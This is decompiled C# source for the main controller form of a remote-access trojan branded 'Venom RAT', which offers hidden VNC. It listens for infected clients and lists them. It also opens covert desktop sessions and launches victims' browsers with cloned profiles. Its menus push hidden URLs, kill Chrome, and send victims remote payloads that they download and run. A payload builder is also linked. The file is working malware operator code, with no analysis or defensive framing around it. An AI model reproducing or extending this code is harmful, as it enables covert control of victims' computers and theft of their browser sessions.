using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Siticone.Desktop.UI.WinForms;

namespace HVNC
{
	// Token: 0x02000017 RID: 23
	public partial class FrmMain : Form
	{
		// Token: 0x0600009E RID: 158 RVA: 0x00002479 File Offset: 0x00000679
		public FrmMain()
		{
			this.InitializeComponent();
		}

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x0600009F RID: 159 RVA: 0x00002487 File Offset: 0x00000687
		// (set) Token: 0x060000A0 RID: 160 RVA: 0x0000248E File Offset: 0x0000068E
		public static int portvalue { get; set; }

		// Token: 0x060000A1 RID: 161 RVA: 0x000081C0 File Offset: 0x000063C0
		public void Listenning()
		{
			checked
			{
				try
				{
					FrmMain._clientList = new List<TcpClient>();
					FrmMain._TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(this.hvncport.Value));
					FrmMain._TcpListener.Start();
					FrmMain._TcpListener.BeginAcceptTcpClient(new AsyncCallback(this.ResultAsync), FrmMain._TcpListener);
				}
				catch (Exception ex)
				{
					try
					{
						if (!ex.Message.Contains("aborted"))
						{
							IEnumerator enumerator = null;
							for (;;)
							{
								try
								{
									try
									{
										foreach (object obj in Application.OpenForms)
										{
											Form form = (Form)obj;
											if (form.Name.Contains("FrmVNC"))
											{
												form.Dispose();
											}
										}
									}
									finally
									{
										if (enumerator is IDisposable)
										{
											(enumerator as IDisposable).Dispose();
										}
									}
								}
								catch (Exception)
								{
									continue;
								}
								break;
							}
							FrmMain.bool_1 = false;
							this.HVNCListenBtn.Text = "Listen";
							int num = FrmMain._clientList.Count - 1;
							for (int i = 0; i <= num; i++)
							{
								FrmMain._clientList[i].Close();
							}
							FrmMain._clientList = new List<TcpClient>();
							FrmMain.int_2 = 0;
							FrmMain._TcpListener.Stop();
							this.ClientsOnline.Text = "Client in HVNC Panel: 0";
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00002496 File Offset: 0x00000696
		public static string RandomNumber(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("0123456789", length)
			select s[FrmMain.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x00008338 File Offset: 0x00006538
		public void ResultAsync(IAsyncResult iasyncResult_0)
		{
			try
			{
				TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
				tcpClient.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(this.ReadResult), tcpClient);
				FrmMain._TcpListener.BeginAcceptTcpClient(new AsyncCallback(this.ResultAsync), FrmMain._TcpListener);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x000083AC File Offset: 0x000065AC
		public void ReadResult(IAsyncResult iasyncResult_0)
		{
			TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
			checked
			{
				try
				{
					BinaryFormatter binaryFormatter = new BinaryFormatter();
					binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
					binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
					binaryFormatter.FilterLevel = TypeFilterLevel.Full;
					byte[] array = new byte[8];
					int i = 8;
					int num = 0;
					while (i > 0)
					{
						int num2 = tcpClient.GetStream().Read(array, num, i);
						i -= num2;
						num += num2;
					}
					ulong num3 = BitConverter.ToUInt64(array, 0);
					byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num3), 1m)) + 1];
					using (MemoryStream memoryStream = new MemoryStream())
					{
						int num4 = 0;
						int j = array2.Length;
						while (j > 0)
						{
							int num5 = tcpClient.GetStream().Read(array2, num4, j);
							j -= num5;
							num4 += num5;
						}
						memoryStream.Write(array2, 0, (int)num3);
						memoryStream.Position = 0L;
						object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
						if (objectValue is string)
						{
							string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[]
							{
								"|"
							}, null, null, null);
							try
							{
								if (Operators.CompareString(array3[0], "54321", false) == 0)
								{
									tcpClient.Close();
								}
								if (Operators.CompareString(array3[0], "754321", false) == 0)
								{
									string str;
									try
									{
										str = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									catch
									{
										str = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									try
									{
										ListViewItem lvi = new ListViewItem(new string[]
										{
											" " + str
										})
										{
											Tag = tcpClient
										};
										this.HVNCList.Invoke(new MethodInvoker(delegate()
										{
											List<TcpClient> clientList = FrmMain._clientList;
											lock (clientList)
											{
												this.HVNCList.Items.Add(lvi);
												this.HVNCList.Items[FrmMain.int_2].Selected = true;
												FrmMain._clientList.Add(tcpClient);
												FrmMain.int_2++;
												this.ClientsOnline.Text = "Client in HVNC Panel: " + Conversions.ToString(FrmMain.int_2);
												GC.Collect();
											}
										}));
										goto IL_235;
									}
									catch (Exception)
									{
										goto IL_235;
									}
								}
								if (FrmMain._clientList.Contains(tcpClient))
								{
									this.GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
								}
								else
								{
									tcpClient.Close();
								}
								IL_235:
								goto IL_26C;
							}
							catch (Exception)
							{
								goto IL_26C;
							}
						}
						if (FrmMain._clientList.Contains(tcpClient))
						{
							this.GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
						}
						else
						{
							tcpClient.Close();
						}
						IL_26C:
						memoryStream.Close();
						memoryStream.Dispose();
					}
					tcpClient.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(this.ReadResult), tcpClient);
				}
				catch (Exception ex)
				{
					if (!ex.Message.Contains("disposed"))
					{
						try
						{
							if (FrmMain._clientList.Contains(tcpClient))
							{
								int NumberReceived;
								for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
								{
									if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
									{
										if (Application.OpenForms[NumberReceived].Visible)
										{
											base.Invoke(new MethodInvoker(delegate()
											{
												if (Application.OpenForms[NumberReceived].IsHandleCreated)
												{
													Application.OpenForms[NumberReceived].Close();
												}
											}));
										}
										else if (Application.OpenForms[NumberReceived].IsHandleCreated)
										{
											Application.OpenForms[NumberReceived].Close();
										}
									}
								}
								this.HVNCList.Invoke(new MethodInvoker(delegate()
								{
									List<TcpClient> clientList = FrmMain._clientList;
									lock (clientList)
									{
										try
										{
											int index = FrmMain._clientList.IndexOf(tcpClient);
											FrmMain._clientList.RemoveAt(index);
											this.HVNCList.Items.RemoveAt(index);
											tcpClient.Close();
											FrmMain.int_2--;
											this.ClientsOnline.Text = "Client in HVNC Panel: " + Conversions.ToString(FrmMain.int_2);
										}
										catch (Exception)
										{
										}
									}
								}));
							}
							goto IL_3D2;
						}
						catch (Exception)
						{
							goto IL_3D2;
						}
					}
					tcpClient.Close();
					IL_3D2:;
				}
			}
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00008824 File Offset: 0x00006A24
		public void GetStatus(object object_2, TcpClient tcpClient_0)
		{
			int hashCode = tcpClient_0.GetHashCode();
			FrmVNC frmVNC = (FrmVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
			if (object_2 is Bitmap)
			{
				frmVNC.VNCBoxe.Image = (Image)object_2;
				return;
			}
			if (!(object_2 is string))
			{
				return;
			}
			string[] array = Conversions.ToString(object_2).Split(new char[]
			{
				'|'
			});
			string left = array[0];
			if (Operators.CompareString(left, "0", false) == 0)
			{
				frmVNC.VNCBoxe.Tag = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
			}
			if (Operators.CompareString(left, "200", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated with cloned profile successfully!";
			}
			if (Operators.CompareString(left, "201", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated successfully!";
			}
			if (Operators.CompareString(left, "202", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated with cloned profile successfully!";
			}
			if (Operators.CompareString(left, "203", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated successfully!";
			}
			if (Operators.CompareString(left, "204", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated with cloned profile successfully!";
			}
			if (Operators.CompareString(left, "205", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated successfully!";
			}
			if (Operators.CompareString(left, "206", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave initiated with cloned profile successfully!";
			}
			if (Operators.CompareString(left, "207", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
			}
			if (Operators.CompareString(left, "256", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
			}
			if (Operators.CompareString(left, "22", false) == 0)
			{
				frmVNC.FrmTransfer0.int_0 = Conversions.ToInteger(array[1]);
				frmVNC.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(array[1]);
			}
			if (Operators.CompareString(left, "23", false) == 0)
			{
				frmVNC.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(array[1]));
			}
			if (Operators.CompareString(left, "25", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
			}
			if (Operators.CompareString(left, "26", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
			}
			if (Operators.CompareString(left, "2555", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
			}
			if (Operators.CompareString(left, "2556", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
			}
			if (Operators.CompareString(left, "2557", false) == 0)
			{
				frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
			}
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x00008B04 File Offset: 0x00006D04
		private void HVNCList_DoubleClick(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (this.HVNCList.SelectedItems.Count == 0)
					{
						MessageBox.Show("You have to select a client first!", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else if (this.HVNCList.FocusedItem.Index != -1)
					{
						for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
						{
							if (Application.OpenForms[i].Tag == FrmMain._clientList[this.HVNCList.FocusedItem.Index])
							{
								Application.OpenForms[i].Show();
								return;
							}
						}
						FrmVNC frmVNC = new FrmVNC();
						frmVNC.Name = "VNCForm:" + Conversions.ToString(FrmMain._clientList[this.HVNCList.FocusedItem.Index].GetHashCode());
						frmVNC.Tag = FrmMain._clientList[this.HVNCList.FocusedItem.Index];
						this.HVNCList.FocusedItem.SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null).Replace("}", null).Replace(":", null).Remove(0, 1);
						frmVNC.Show();
					}
				}
				catch (Exception)
				{
					MessageBox.Show("You have to select a client first!", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x000024D1 File Offset: 0x000006D1
		private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			e.DrawDefault = true;
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x000024DA File Offset: 0x000006DA
		private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x00008C8C File Offset: 0x00006E8C
		private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			if (e.Item.Selected)
			{
				e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds);
				TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point), checked(new Point(e.Bounds.Left + 3, e.Bounds.Top + 2)), Color.White);
				return;
			}
			e.DrawDefault = true;
		}

		// Token: 0x060000AA RID: 170 RVA: 0x00008D20 File Offset: 0x00006F20
		public void HVNCListenBtn_Click_1(object sender, EventArgs e)
		{
			new FrmBuilder();
			if (Operators.CompareString(this.PortStatus.Text, "Listening Port", false) == 0)
			{
				this.PortStatus.Text = "Disable Port";
				this.HVNCListenBtn.Image = this.imageList2.Images[0];
				this.HVNCListenPort.Enabled = false;
				this.VNC_Thread = new Thread(new ThreadStart(this.Listenning))
				{
					IsBackground = true
				};
				FrmMain.bool_1 = true;
				this.VNC_Thread.Start();
				return;
			}
			IEnumerator enumerator = null;
			for (;;)
			{
				try
				{
					try
					{
						foreach (object obj in Application.OpenForms)
						{
							Form form = (Form)obj;
							if (form.Name.Contains("FrmVNC"))
							{
								form.Dispose();
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception)
				{
					continue;
				}
				break;
			}
			this.HVNCListenPort.Enabled = true;
			this.VNC_Thread.Abort();
			FrmMain.bool_1 = false;
			this.PortStatus.Text = "Start Port";
			this.HVNCListenBtn.Image = this.imageList2.Images[1];
			this.HVNCList.Items.Clear();
			FrmMain._TcpListener.Stop();
			checked
			{
				int num = FrmMain._clientList.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					FrmMain._clientList[i].Close();
				}
				FrmMain._clientList = new List<TcpClient>();
				FrmMain.int_2 = 0;
				this.ClientsOnline.Text = "Client in HVNC Panel: 0";
			}
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00008ED4 File Offset: 0x000070D4
		public void StartStopPort()
		{
			new FrmBuilder();
			if (Operators.CompareString(this.PortStatus.Text, "Start Port", false) == 0)
			{
				this.PortStatus.Text = "Disable Port";
				this.HVNCListenBtn.Image = this.imageList2.Images[0];
				this.HVNCListenPort.Enabled = false;
				this.VNC_Thread = new Thread(new ThreadStart(this.Listenning))
				{
					IsBackground = true
				};
				FrmMain.bool_1 = true;
				this.VNC_Thread.Start();
				return;
			}
			IEnumerator enumerator = null;
			for (;;)
			{
				try
				{
					try
					{
						foreach (object obj in Application.OpenForms)
						{
							Form form = (Form)obj;
							if (form.Name.Contains("FrmVNC"))
							{
								form.Dispose();
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception)
				{
					continue;
				}
				break;
			}
			this.HVNCListenPort.Enabled = true;
			this.VNC_Thread.Abort();
			FrmMain.bool_1 = false;
			this.PortStatus.Text = "Start Port";
			this.HVNCListenBtn.Image = this.imageList2.Images[1];
			this.HVNCList.Items.Clear();
			FrmMain._TcpListener.Stop();
			checked
			{
				int num = FrmMain._clientList.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					FrmMain._clientList[i].Close();
				}
				FrmMain._clientList = new List<TcpClient>();
				FrmMain.int_2 = 0;
				this.ClientsOnline.Text = "Clients Online: 0";
			}
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00009088 File Offset: 0x00007288
		private void FrmMain_Load(object sender, EventArgs e)
		{
			this.HVNCList.View = View.Details;
			this.HVNCList.HideSelection = false;
			this.HVNCList.OwnerDraw = true;
			this.HVNCList.BackColor = Color.FromArgb(24, 24, 24);
			this.HVNCList.BackColor = Color.FromArgb(27, 27, 27);
			this.HVNCList.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				Brush brush = new SolidBrush(Color.FromArgb(36, 36, 36));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			this.HVNCList.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.HVNCList.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			this.ClientsOnline.Text = "Client in HVNC Panel: 0";
		}

		// Token: 0x060000AD RID: 173 RVA: 0x000024F0 File Offset: 0x000006F0
		private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
		{
		}

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x060000AE RID: 174 RVA: 0x000024F2 File Offset: 0x000006F2
		// (set) Token: 0x060000AF RID: 175 RVA: 0x000024F9 File Offset: 0x000006F9
		public static string saveurl { get; set; }

		// Token: 0x060000B0 RID: 176 RVA: 0x00009174 File Offset: 0x00007374
		private void visitURLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.HVNCList.SelectedItems.Count == 0)
				{
					MessageBox.Show("You have to select a client first! ", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					new FrmURL().ShowDialog();
					if (FrmMain.ispressed)
					{
						FrmVNC frmVNC = new FrmVNC();
						foreach (object obj in this.HVNCList.SelectedItems)
						{
							this.count = this.HVNCList.SelectedItems.Count;
						}
						for (int i = 0; i < this.count; i++)
						{
							frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
							object tag = this.HVNCList.SelectedItems[i].Tag;
							frmVNC.Tag = tag;
							frmVNC.hURL(FrmMain.saveurl);
							frmVNC.Dispose();
						}
						MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						FrmMain.ispressed = false;
					}
				}
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				base.Close();
			}
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x000092F4 File Offset: 0x000074F4
		private void killChromeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FrmVNC frmVNC = new FrmVNC();
			foreach (object obj in this.HVNCList.SelectedItems)
			{
				this.count = this.HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < this.count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
				object tag = this.HVNCList.SelectedItems[i].Tag;
				frmVNC.Tag = tag;
				frmVNC.KillChrome();
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x000093F0 File Offset: 0x000075F0
		private void resetScaleToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FrmVNC frmVNC = new FrmVNC();
			foreach (object obj in this.HVNCList.SelectedItems)
			{
				this.count = this.HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < this.count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
				object tag = this.HVNCList.SelectedItems[i].Tag;
				frmVNC.Tag = tag;
				frmVNC.ResetScale();
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x060000B3 RID: 179 RVA: 0x00002501 File Offset: 0x00000701
		// (set) Token: 0x060000B4 RID: 180 RVA: 0x00002508 File Offset: 0x00000708
		public static string MassURL { get; set; }

		// Token: 0x060000B5 RID: 181 RVA: 0x00002510 File Offset: 0x00000710
		private void builderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			new FrmBuilder().ShowDialog();
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x0000251D File Offset: 0x0000071D
		private void TogglePort_Click(object sender, EventArgs e)
		{
			this.HVNCListenBtn.PerformClick();
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x000094EC File Offset: 0x000076EC
		private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.HVNCList.SelectedItems.Count == 0)
				{
					MessageBox.Show("You have to select a client first! ", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					new FrmMassUpdate().ShowDialog();
					if (FrmMain.ispressed)
					{
						FrmVNC frmVNC = new FrmVNC();
						foreach (object obj in this.HVNCList.SelectedItems)
						{
							this.count = this.HVNCList.SelectedItems.Count;
						}
						for (int i = 0; i < this.count; i++)
						{
							frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
							object tag = this.HVNCList.SelectedItems[i].Tag;
							frmVNC.Tag = tag;
							frmVNC.UpdateClient(FrmMain.MassURL);
							frmVNC.Dispose();
						}
						MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						FrmMain.ispressed = false;
					}
				}
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Has Occured", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				base.Close();
			}
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x0000252A File Offset: 0x0000072A
		private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.HVNCListenBtn.PerformClick();
			Thread.Sleep(500);
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00009674 File Offset: 0x00007874
		private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.HVNCList.SelectedItems.Count == 0)
				{
					MessageBox.Show("You have to select a client first! ", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else if (MessageBox.Show("Are you sure you want to close the connection?", "Venom RAT", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
				{
					FrmVNC frmVNC = new FrmVNC();
					foreach (object obj in this.HVNCList.SelectedItems)
					{
						this.count = this.HVNCList.SelectedItems.Count;
					}
					for (int i = 0; i < this.count; i++)
					{
						frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
						object tag = this.HVNCList.SelectedItems[i].Tag;
						frmVNC.Tag = tag;
						frmVNC.CloseClient();
						frmVNC.Dispose();
					}
					MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Has Occured", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				base.Close();
			}
		}

		// Token: 0x04000050 RID: 80
		public static List<TcpClient> _clientList;

		// Token: 0x04000051 RID: 81
		public static TcpListener _TcpListener;

		// Token: 0x04000052 RID: 82
		private Thread VNC_Thread;

		// Token: 0x04000053 RID: 83
		public static int SelectClient;

		// Token: 0x04000054 RID: 84
		public static bool bool_1;

		// Token: 0x04000055 RID: 85
		public static int int_2;

		// Token: 0x04000056 RID: 86
		public static string isadmin;

		// Token: 0x04000057 RID: 87
		public static string detecav;

		// Token: 0x04000059 RID: 89
		public static Random random = new Random();

		// Token: 0x0400005A RID: 90
		public int count;

		// Token: 0x0400005C RID: 92
		public static bool ispressed = false;
	}
}
